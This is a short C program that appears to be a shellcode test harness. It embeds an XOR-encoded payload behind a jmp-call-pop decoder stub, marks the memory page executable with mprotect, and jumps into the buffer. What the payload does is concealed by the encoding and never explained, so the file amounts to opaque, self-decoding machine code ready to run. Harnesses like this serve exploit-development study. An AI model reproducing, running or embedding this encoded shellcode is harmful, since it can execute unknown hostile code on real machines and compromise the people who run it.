#include <sys/mman.h>
#include <stdio.h>
#include <string.h>

unsigned char code[] = "\xeb\x20\x5e\x31\xc9\xf7\xe1\x31\xdb\x8a\x14\x0e\x8a\x5c\x0e\x01\x80\xfb\xff\x74\x0b\x30\xd3\x88\x1c\x06\x83\xc1\x02\x40\xeb\xe9\xff\xe6\xe8\xdb\xff\xff\xff\x8b\x56\x97\x56\xab\x14\x77\x27\x8e\x4a\x1b\x5a\x9a\x3e\x22\xfb\xc8\xbc\xef\xcb\x74\x80\x91\xcb\x1c\x37\x55\x9c\xce\x7f\x9c\x8f\x17\x26\xb3\xc9\x90\x88\x66\x65\xf2\x88\x7b\x63\xcb\x48\x78\xba\x40\x14\x23\x05\x91\x25\xa2\xed\xd7\xb5\x01\x1f\xd2\xe0\xae\x3e\xef\x65\x0f\x51\x37\x51\x45\xe4\xe9\xaa\xcb\x58\x4a\x52\x83\xcb\xf9\x69\x3b\xaf\x2b\x31\x86\xcd\x28\x3e\xd1\x34\xf3\x66\xed\x41\x42\xdd\xb4\xa8\x59\x46\x81\xb3\x77\xf8\xca\x14\x76\x16\x04\xfa\x96\xb9\x82\xd5\xd3\x71\x7d\xc5\x7e\x55\xcc\xa4\x86\xa5\x6e\xd7\x66\xee\xd4\xbd\xcc\xef\x5d\xe4\x78\x96\xe7\x43\xd4\x77\x71\x70\xb7\x58\x9d\xab\xb6\x12\x74\x05\xfe\xaa\x4a\x7c\xb5\x11\x42\x33\x09\xa3\xc2\x38\x3f\x1b\xf5\x6c\xd7\xb8\xbd\x46\x09\xd3\x66\xc3\x5b\x1b\x08\x69\x77\x26\xb4\x8d\x16\xa7\xcd\xd4\x76\x8e\x1c\xd2\x75\xcb\x94\x3a\x09\x97\x39\x09\xff\xff";


int main(){
  printf("Shellcode length: %d\n", strlen(code));
  int r =  mprotect((void *)((int)code & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())code;
  return ret();
}